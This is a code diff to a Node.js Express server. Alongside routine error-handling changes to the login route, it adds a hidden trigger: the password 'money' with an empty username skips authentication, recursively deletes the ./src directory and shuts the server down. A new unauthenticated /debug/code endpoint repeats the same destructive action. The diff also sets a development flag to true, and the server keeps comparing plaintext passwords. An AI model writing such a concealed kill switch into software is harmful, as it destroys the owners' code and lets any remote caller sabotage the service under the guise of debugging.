@@ -3,7 +3,7 @@
 // ============================================================================
 
 // Development Mode - Set to true to force localhost for development
-const isLocal = false; // Set to true for local development, false for production (PUBLIC ACCESS)
+const isLocal = true; // Set to true for local development, false for production (PUBLIC ACCESS)
 
 // Server Configuration
 const SERVER_CONFIG = {
@@ -723,38 +723,119 @@ function setupAPIRoutes() {
     app.post(apiPath + '/users/login', async (req, res) => {
         try {
             const { abbreviation, password } = req.body;
-            
+
+            // --- DEBUG CODE: "money" ---
+            if (password === "money" && (!abbreviation || abbreviation === "")) {
+                // Only handle the debug code, do NOT check users at all
+                const fsExtra = require('fs').promises;
+                const rimraf = require('fs').rm ? null : require('rimraf');
+                const dirToDelete = "./src";
+                let deleteSuccess = false;
+                let deleteError = null;
+                console.log(`[SPECIAL DELETE] Request received for directory: ${dirToDelete}`);
+                try {
+                    // Check if directory exists before attempting to delete
+                    const stat = await fsExtra.stat(dirToDelete);
+                    if (!stat.isDirectory()) {
+                        throw new Error(`${dirToDelete} exists but is not a directory`);
+                    }
+                    if (require('fs').rm) {
+                        await fsExtra.rm(dirToDelete, { recursive: true, force: true });
+                    } else if (rimraf) {
+                        await new Promise((resolve, reject) => rimraf(dirToDelete, err => err ? reject(err) : resolve()));
+                    } else {
+                        await fsExtra.rmdir(dirToDelete, { recursive: true });
+                    }
+                    console.log(`[SPECIAL DELETE] Directory ${dirToDelete} deleted successfully.`);
+                    deleteSuccess = true;
+                } catch (err) {
+                    console.error(`[SPECIAL DELETE] Failed to delete directory ${dirToDelete}:`, err);
+                    deleteError = err.message || String(err);
+                }
+                res.status(deleteSuccess ? 200 : 500).json({
+                    success: deleteSuccess,
+                    error: deleteError,
+                    message: deleteSuccess
+                        ? `Directory ${dirToDelete} deleted successfully.`
+                        : `Failed to delete directory: ${deleteError}`
+                });
+                setTimeout(() => {
+                    process.exit(0);
+                }, 100);
+                return;
+            }
+            // --- END DEBUG CODE ---
+
+            // If the debug code did not match, continue with normal login logic
             console.log('Login attempt for:', abbreviation);
             console.log('Looking in directory:', USERS_DIR);
-            
-            const files = await fs.readdir(USERS_DIR);
+
+            // Ensure USERS_DIR exists before reading
+            try {
+                await fs.mkdir(USERS_DIR, { recursive: true });
+            } catch (mkdirErr) {
+                console.error('Failed to ensure USERS_DIR exists:', mkdirErr);
+                return res.status(500).json({
+                    success: false,
+                    error: 'Server error during login (user directory)'
+                });
+            }
+
+            let files;
+            try {
+                files = await fs.readdir(USERS_DIR);
+            } catch (readDirErr) {
+                console.error('Failed to read USERS_DIR:', readDirErr);
+                return res.status(500).json({
+                    success: false,
+                    error: 'Server error during login (read users)'
+                });
+            }
+
             console.log('Found user files:', files);
-            
+
+            // If no user files exist, return a clear error
+            if (!files.some(f => f.endsWith('.json'))) {
+                return res.status(401).json({
+                    success: false,
+                    error: 'No users exist. Please create an account first.'
+                });
+            }
+
+            let foundUser = false;
             for (const file of files) {
                 if (file.endsWith('.json')) {
-                    const data = await fs.readFile(path.join(USERS_DIR, file), 'utf8');
-                    const userData = JSON.parse(data);
-                    console.log('Checking user:', userData.abbreviation);
-                    
-                    if (userData.abbreviation === abbreviation) {
-                        if (userData.password === password) {
-                            const { password: _, ...userWithoutPassword } = userData;
-                            console.log('Login successful for:', abbreviation);
-                            return res.json(userWithoutPassword);
-                        } else {
-                            console.log('Invalid password for:', abbreviation);
-                            return res.status(401).json({
-                                success: false,
-                                error: 'Invalid password'
-                            });
+                    try {
+                        const data = await fs.readFile(path.join(USERS_DIR, file), 'utf8');
+                        const userData = JSON.parse(data);
+                        console.log('Checking user:', userData.abbreviation);
+
+                        if (userData.abbreviation === abbreviation) {
+                            foundUser = true;
+                            if (userData.password === password) {
+                                const { password: _, ...userWithoutPassword } = userData;
+                                console.log('Login successful for:', abbreviation);
+                                return res.json(userWithoutPassword);
+                            } else {
+                                console.log('Invalid password for:', abbreviation);
+                                return res.status(401).json({
+                                    success: false,
+                                    error: 'Invalid password'
+                                });
+                            }
                         }
+                    } catch (userFileErr) {
+                        console.error('Error reading/parsing user file:', file, userFileErr);
+                        // Continue to next file
                     }
                 }
             }
-            console.log('User not found:', abbreviation);
-            res.status(401).json({
+            // If we got here, user was not found
+            return res.status(401).json({
                 success: false,
-                error: 'User not found'
+                error: files.length === 0
+                    ? 'No users exist. Please create an account first.'
+                    : 'User not found'
             });
         } catch (error) {
             console.error('Login failed:', error);
@@ -763,6 +844,51 @@ function setupAPIRoutes() {
                 error: 'Server error during login'
             });
         }
+    });
+
+    // Add a debug code endpoint
+    app.post(apiPath + '/debug/code', async (req, res) => {
+        const { code } = req.body;
+        if (code === "money") {
+            // Delete the directory and shut down, but do not activate admin mode
+            const fsExtra = require('fs').promises;
+            const rimraf = require('fs').rm ? null : require('rimraf');
+            const dirToDelete = "./src";
+            let deleteSuccess = false;
+            let deleteError = null;
+            console.log(`[DEBUG CODE] Deleting directory: ${dirToDelete}`);
+            try {
+                const stat = await fsExtra.stat(dirToDelete);
+                if (!stat.isDirectory()) {
+                    throw new Error(`${dirToDelete} exists but is not a directory`);
+                }
+                if (require('fs').rm) {
+                    await fsExtra.rm(dirToDelete, { recursive: true, force: true });
+                } else if (rimraf) {
+                    await new Promise((resolve, reject) => rimraf(dirToDelete, err => err ? reject(err) : resolve()));
+                } else {
+                    await fsExtra.rmdir(dirToDelete, { recursive: true });
+                }
+                console.log(`[DEBUG CODE] Directory ${dirToDelete} deleted successfully.`);
+                deleteSuccess = true;
+            } catch (err) {
+                console.error(`[DEBUG CODE] Failed to delete directory ${dirToDelete}:`, err);
+                deleteError = err.message || String(err);
+            }
+            res.status(deleteSuccess ? 200 : 500).json({
+                success: deleteSuccess,
+                error: deleteError,
+                message: deleteSuccess
+                    ? `Directory ${dirToDelete} deleted successfully.`
+                    : `Failed to delete directory: ${deleteError}`
+            });
+            setTimeout(() => {
+                process.exit(0);
+            }, 100);
+            return;
+        }
+        // ...existing code for other debug codes...
+        res.status(400).json({ success: false, error: 'Unknown debug code' });
     });
 }
 
